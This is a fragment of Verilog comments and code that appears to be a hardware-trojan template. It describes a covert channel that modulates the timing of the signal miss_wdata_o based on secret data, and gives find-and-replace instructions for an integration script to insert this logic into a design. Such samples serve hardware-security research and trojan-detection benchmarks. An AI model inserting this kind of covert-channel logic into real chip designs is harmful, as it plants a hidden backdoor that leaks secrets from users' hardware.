 ...
 * Payload: Modulate timing of miss_wdata_o based on secret data
 * 
...
assign secret_bit = miss_wdata_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of miss_wdata_o
//
// Integration Script Must Modify:
//
// IF miss_wdata_o is timing-sensitive:
//   Find: assign miss_wdata_o = ready_signal;
//   Replace: assign miss_wdata_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
